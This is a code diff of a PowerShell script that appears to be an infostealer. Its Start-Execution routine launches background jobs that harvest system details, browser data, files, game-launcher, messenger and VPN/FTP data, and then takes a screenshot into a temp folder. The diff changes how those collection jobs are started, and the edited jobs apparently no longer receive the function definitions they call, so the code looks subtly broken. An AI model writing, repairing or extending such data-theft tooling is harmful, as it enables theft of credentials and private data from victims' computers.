@@ -185,24 +185,24 @@ function Start-Execution {
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
     New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
     $jobs = @()
-
     WriteMsg "SystemCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir, ${function:Get-SystemInfo}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-SystemInfo -OutDirectory "$dir\System" } -ArgumentList $tempDir
     WriteMsg "BrowsersCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir, ...) . ([ScriptBlock]::Create(...)); Get-BrowserData -OutDirectory "$dir\Browsers" } -ArgumentList ...
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-BrowserData -OutDirectory "$dir\Browsers" } -ArgumentList $tempDir
     WriteMsg "FilesCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Gather-Files -OutDirectory "$dir\Files" } -ArgumentList $tempDir, ${function:Gather-Files}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Gather-Files -OutDirectory "$dir\Files" } -ArgumentList $tempDir
     WriteMsg "GamingCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Get-GameLauncherData -OutDirectory "$dir\Gaming" } -ArgumentList $tempDir, ${function:Get-GameLauncherData}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-GameLauncherData -OutDirectory "$dir\Gaming" } -ArgumentList $tempDir
     WriteMsg "MessengersCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Get-MessengerData -OutDirectory "$dir\Messengers" } -ArgumentList $tempDir, ${function:Get-MessengerData}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-MessengerData -OutDirectory "$dir\Messengers" } -ArgumentList $tempDir
     WriteMsg "UserActivity"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Get-UserActivity -OutDirectory "$dir\Activity" } -ArgumentList $tempDir, ${function:Get-UserActivity}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-UserActivity -OutDirectory "$dir\Activity" } -ArgumentList $tempDir
     WriteMsg "NetworkCollect"
-    $jobs += Start-Job -ScriptBlock { param($dir,$funcDef); . ([ScriptBlock]::Create($funcDef)); Get-VpnFtpData -OutDirectory "$dir\Network" } -ArgumentList $tempDir, ${function:Get-VpnFtpData}.ToString()
+    $jobs += Start-Job -ScriptBlock { param($dir); Get-VpnFtpData -OutDirectory "$dir\Network" } -ArgumentList $tempDir
 
     $jobs | Wait-Job | Receive-Job | Out-Null
     $jobs | Remove-Job
+
 
     WriteMsg "Screenshot"
     Take-Screenshot -OutFile "$tempDir\screenshot.png"
